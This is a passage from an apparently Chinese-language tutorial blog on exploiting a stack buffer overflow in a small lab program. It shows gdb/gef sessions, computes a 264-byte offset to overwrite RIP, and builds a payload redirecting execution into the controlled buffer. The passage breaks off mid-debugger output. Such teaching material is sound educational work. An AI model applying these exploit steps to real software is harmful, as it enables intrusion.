class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/overflow$ gdb-gef bof</span><br><span class="line">gef➤  disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00005555555551a9 &lt;+0&gt;:	endbr64 </span><br><span class="line">   0x00005555555551ad &lt;+4&gt;:	push   rbp</span><br><span class="line">   0x00005555555551ae &lt;+5&gt;:	mov    rbp,rsp</span><br><span class="line">   0x00005555555551b1 &lt;+8&gt;:	sub    rsp,0x110</span><br><span class="line">   0x00005555555551b8 &lt;+15&gt;:	mov    DWORD PTR [rbp-0x104],edi</span><br><span class="line">   0x00005555555551be &lt;+21&gt;:	mov    QWORD PTR [rbp-0x110],rsi</span><br><span class="line">   0x00005555555551c5 &lt;+28&gt;:	cmp    DWORD PTR [rbp-0x104],0x2</span><br><span class="line">   0x00005555555551cc &lt;+35&gt;:	je     0x5555555551d8 &lt;main+47&gt;</span><br><span class="line">   0x00005555555551ce &lt;+37&gt;:	mov    edi,0x0</span><br><span class="line">   0x00005555555551d3 &lt;+42&gt;:	call   0x5555555550b0 &lt;exit@plt&gt;</span><br><span class="line">   0x00005555555551d8 &lt;+47&gt;:	lea    rax,[rbp-0x100]</span><br><span class="line">   0x00005555555551df &lt;+54&gt;:	mov    rsi,rax</span><br><span class="line">   0x00005555555551e2 &lt;+57&gt;:	lea    rdi,[rip+0xe1b]        # 0x555555556004</span><br><span class="line">   0x00005555555551e9 &lt;+64&gt;:	mov    eax,0x0</span><br><span class="line">   0x00005555555551ee &lt;+69&gt;:	call   0x5555555550a0 &lt;printf@plt&gt;</span><br><span class="line">   0x00005555555551f3 &lt;+74&gt;:	mov    rax,QWORD PTR [rbp-0x110]</span><br><span class="line">   0x00005555555551fa &lt;+81&gt;:	add    rax,0x8</span><br><span class="line">   0x00005555555551fe &lt;+85&gt;:	mov    rdx,QWORD PTR [rax]</span><br><span class="line">   0x0000555555555201 &lt;+88&gt;:	lea    rax,[rbp-0x100]</span><br><span class="line">   0x0000555555555208 &lt;+95&gt;:	mov    rsi,rdx</span><br><span class="line">   0x000055555555520b &lt;+98&gt;:	mov    rdi,rax</span><br><span class="line">   0x000055555555520e &lt;+101&gt;:	call   0x555555555080 &lt;strcpy@plt&gt;</span><br><span class="line">   0x0000555555555213 &lt;+106&gt;:	lea    rax,[rbp-0x100]</span><br><span class="line">   0x000055555555521a &lt;+113&gt;:	mov    rdi,rax</span><br><span class="line">   0x000055555555521d &lt;+116&gt;:	call   0x555555555090 &lt;puts@plt&gt;</span><br><span class="line">   0x0000555555555222 &lt;+121&gt;:	mov    eax,0x0</span><br><span class="line">   0x0000555555555227 &lt;+126&gt;:	leave  </span><br><span class="line">=&gt; 0x0000555555555228 &lt;+127&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">gef➤  b strcpy</span><br><span class="line">gef➤  b puts</span><br><span class="line">gef➤  r $(python -c &#x27;print &quot;A&quot; * 300&#x27;)</span><br><span class="line">Starting program: /home/sakura/文档/overflow/bof $(python -c &#x27;print &quot;A&quot; * 300&#x27;)</span><br><span class="line">0x7fffffffdd40</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">Breakpoint 2, 0x00007ffff7e3a420 in puts () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x00007fffffffdd40  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x16</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffdd28  →  0x0000555555555222  →  &lt;main+121&gt; mov eax, 0x0</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x00007fffffffde40  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x00007fffffffe3c0  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAA&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007fffffffdd40  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x00007ffff7e3a420  →  &lt;puts+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0xf</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x0000555555556006  →  0x00443b031b01000a (<span class="string">&quot;\n&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x246</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x00005555555550c0  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffdf30  →  0x0000000000000002</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [zero carry PARITY adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffdd28│+0x0000: 0x0000555555555222  →  &lt;main+121&gt; mov eax, 0x0	 ← $rsp</span><br><span class="line">0x00007fffffffdd30│+0x0008: 0x00007fffffffdf38  →  0x00007fffffffe289  →  0x61732f656d6f682f</span><br><span class="line">0x00007fffffffdd38│+0x0010: 0x0000000200000340</span><br><span class="line">0x00007fffffffdd40│+0x0018: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;	 ← $rax, $rdi</span><br><span class="line">0x00007fffffffdd48│+0x0020: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span><br><span class="line">0x00007fffffffdd50│+0x0028: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span><br><span class="line">0x00007fffffffdd58│+0x0030: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span><br><span class="line">0x00007fffffffdd60│+0x0038: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e3a40f &lt;popen+143&gt;      jmp    0x7ffff7e3a3e4 &lt;popen+100&gt;</span><br><span class="line">   0x7ffff7e3a411                  nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x7ffff7e3a41b                  nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e3a420 &lt;puts+0&gt;         endbr64 </span><br><span class="line">   0x7ffff7e3a424 &lt;puts+4&gt;         push   r14</span><br><span class="line">   0x7ffff7e3a426 &lt;puts+6&gt;         push   r13</span><br><span class="line">   0x7ffff7e3a428 &lt;puts+8&gt;         push   r12</span><br><span class="line">   0x7ffff7e3a42a &lt;puts+10&gt;        mov    r12, rdi</span><br><span class="line">   0x7ffff7e3a42d &lt;puts+13&gt;        push   rbp</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;bof&quot;</span>, stopped 0x7ffff7e3a420 <span class="keyword">in</span> puts (), reason: BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x7ffff7e3a420 → puts()</span></span><br><span class="line"><span class="meta">[#</span><span class="language-bash">1] 0x555555555222 → main(argc=0x2, argv=0x7fffffffdf38)</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure><p>我们发现，明明在 <code>strcpy</code> 上也下了断点，可是并未停止，不知道为什么我们 <code>r</code> 后，直接就在 <code>puts</code> 处停止了。过了 <code>strcpy</code> 调用之后你会发现当前缓冲区指针指向 <code>0x00007fffffffdd40</code> 而不是 <code>0x7fffffffddb0</code> 这是gdb的环境变量和其他东西造成的。不过现在我们不关心之后会解决的，继续向下看 si 到 <code>ret</code> 指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">gef➤  finish</span><br><span class="line">......</span><br><span class="line">gef➤  si</span><br><span class="line">0x0000555555555228	14	&#125;</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0x00007ffff7ec4077  →  0x5177fffff0003d48 (<span class="string">&quot;H=&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffde48  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x4141414141414141 (<span class="string">&quot;AAAAAAAA&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x00005555555592a0  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007ffff7fa47e0  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x0000555555555228  →  &lt;main+127&gt; ret</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x12d</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0xf</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x0000555555556006  →  0x00443b031b01000a (<span class="string">&quot;\n&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x246</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x00005555555550c0  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffdf30  →  0x0000000000000002</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [ZERO carry PARITY adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffde48│+0x0000: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;	 ← $rsp</span><br><span class="line">0x00007fffffffde50│+0x0008: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">0x00007fffffffde58│+0x0010: &quot;AAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">0x00007fffffffde60│+0x0018: &quot;AAAAAAAAAAAA&quot;</span><br><span class="line">0x00007fffffffde68│+0x0020: 0x0000550041414141 (&quot;AAAA&quot;?)</span><br><span class="line">0x00007fffffffde70│+0x0028: 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64 </span><br><span class="line">0x00007fffffffde78│+0x0030: 0x395b03b9e69a9ef5</span><br><span class="line">0x00007fffffffde80│+0x0038: 0x00005555555550c0  →  &lt;_start+0&gt; endbr64 </span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x55555555521d &lt;main+116&gt;       call   0x555555555090 &lt;puts@plt&gt;</span><br><span class="line">   0x555555555222 &lt;main+121&gt;       mov    eax, 0x0</span><br><span class="line">   0x555555555227 &lt;main+126&gt;       leave  </span><br><span class="line"> → 0x555555555228 &lt;main+127&gt;       ret    </span><br><span class="line">[!] Cannot disassemble from $PC</span><br><span class="line">─────────────────────────────────────────────────────────── source:bof.c+14 ────</span><br><span class="line">      9	       &#125;</span><br><span class="line">     10	       printf(&quot;%p\n&quot;, buffer);</span><br><span class="line">     11	       strcpy(buffer,  argv[1]);</span><br><span class="line">     12	       printf(&quot;%s\n&quot;, buffer);</span><br><span class="line">     13	       return 0;</span><br><span class="line"> →   14	 &#125;</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;bof&quot;</span>, stopped 0x555555555228 <span class="keyword">in</span> main (), reason: SINGLE STEP</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x555555555228 → main(argc=0x2, argv=0x7fffffffdf38)</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p>当执行 <code>ret</code> 时，<code>rsp ---&gt; 0x4141414141414141</code>，我们没能控制 <code>RIP</code> 为什么因为我们覆盖了太多位，最大的地址是 <code>0x00007fffffffffff</code> 而我们尝试用 <code>0x4141414141414141</code> 去溢出了。</p><h2 id="4-控制rip"><a class="markdownIt-Anchor" href="#4-控制rip"></a> 4. 控制RIP</h2><p>为了解决这个问题，我们可以用个小一点的缓冲区去溢出这样指向 <code>rsp</code> 的地址就会像 <code>0x0000414141414141</code> 一样了。 通过简单的数学运算就可以很轻松地算出我们缓冲区的大小。我们知道缓冲区开始于 <code>0x00007fffffffdd40</code> 。strcpy 之后 rsp 将指向 <code>0x00007fffffffde48</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00007fffffffde48 - 0x00007fffffffdd40 = 0x108 -&gt; 十进制的264</span><br></pre></td></tr></table></figure><p>知道了这些我们可以把溢出载荷修改成这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;A&quot; * 264 + &quot;B&quot; * 6</span><br></pre></td></tr></table></figure><p>rsp指向的地址应该是 0x0000424242424242 ，那样就能控制RIP。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0x00007ffff7ec4077  →  0x5177fffff0003d48 (<span class="string">&quot;H=&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffde70  →  0x00007ffff7ffc620  →  0x00050a3600000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x4141414141414141 (<span class="string">&quot;AAAAAAAA&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x00005555555592a0  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007ffff7fa47e0  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x424242424242</span>    </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x10f</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0xf</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x0000555555556006  →  0x00443b031b01000a (<span class="string">&quot;\n&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x246</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x00005555555550c0  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffdf50  →  0x0000000000000002</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [ZERO carry PARITY adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow RESUME virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffde70│+0x0000: 0x00007ffff7ffc620  →  0x00050a3600000000	 ← $rsp</span><br><span class="line">0x00007fffffffde78│+0x0008: 0x00007fffffffdf58  →  0x00007fffffffe2a7  →  0x61732f656d6f682f</span><br><span class="line">0x00007fffffffde80│+0x0010: 0x0000000200000000</span><br><span class="line">0x00007fffffffde88│+0x0018: 0x00005555555551a9  →  &lt;main+0&gt; endbr64 </span><br><span class="line">0x00007fffffffde90│+0x0020: 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64 </span><br><span class="line">0x00007fffffffde98│+0x0028: 0xbdf64f9ef20c1d5a</span><br><span class="line">0x00007fffffffdea0│+0x0030: 0x00005555555550c0  →  &lt;_start+0&gt; endbr64 </span><br><span class="line">0x00007fffffffdea8│+0x0038: 0x00007fffffffdf50  →  0x0000000000000002</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">[!] Cannot disassemble from $PC</span><br><span class="line">[!] Cannot access memory at address 0x424242424242</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;bof&quot;</span>, stopped 0x424242424242 <span class="keyword">in</span> ?? (), reason: SIGSEGV</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p>可以看到 <code>$rip : 0x424242424242</code> ，程序流程已经被我们控制了。</p><h2 id="5-跳入用户控制的缓冲区"><a class="markdownIt-Anchor" href="#5-跳入用户控制的缓冲区"></a> 5. 跳入用户控制的缓冲区</h2><p>事实上这部分内容没什么特别的或者新的东西你只需要指向你<strong>控制的缓冲区开头</strong>，也就是第一个 <code>printf</code> 显示出来的值，在这里是 <code>0x00007fffffffdd40</code>。通过 <code>gdb</code> 也可以很容易地重新获得这个值你只需在调用 <code>strcpy</code> 之后显示栈。（在上面是我们运行到断点 puts 处）</p><p>是时候更新我们的载荷了，新的载荷看起来像这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;A&quot; * 264 + &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1] </span><br></pre></td></tr></table></figure><p>因为是小端结构所以我们需要把内存地址反序。这就是python语句[::-1]所实现的。</p><p>确认下我们跳入正确的地址，gdb 调试程序到指令 ret 处：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b puts</span><br><span class="line">Breakpoint 1 at 0x1090</span><br><span class="line">gef➤  r $(python -c &#x27;print &quot;A&quot; * 264 + &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;) </span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0x00007ffff7ec4077  →  0x5177fffff0003d48 (<span class="string">&quot;H=&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffde68  →  0x00007fffffffdd40  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x4141414141414141 (<span class="string">&quot;AAAAAAAA&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x00005555555592a0  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007ffff7fa47e0  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x0000555555555228  →  &lt;main+127&gt; ret</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x10f</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0xf</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x0000555555556006  →  0x00443b031b01000a (<span class="string">&quot;\n&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x246</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x00005555555550c0  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffdf50  →  0x0000000000000002</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [ZERO carry PARITY adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span 